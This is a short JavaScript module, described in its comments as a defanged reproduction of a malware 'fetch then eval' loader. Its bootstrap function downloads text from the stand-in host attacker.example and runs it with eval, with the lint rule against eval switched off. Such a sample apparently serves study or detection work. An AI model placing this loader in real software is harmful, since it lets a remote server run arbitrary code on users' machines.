// Defanged reproduction of the "fetch then eval" loader pattern.
// The real-world payload would download from a C2 host; we use example.com.
async function bootstrap() {
  const r = await fetch("https://attacker.example/p");
  const code = await r.text();
  // eslint-disable-next-line no-eval
  eval(code);
}
module.exports = { bootstrap };
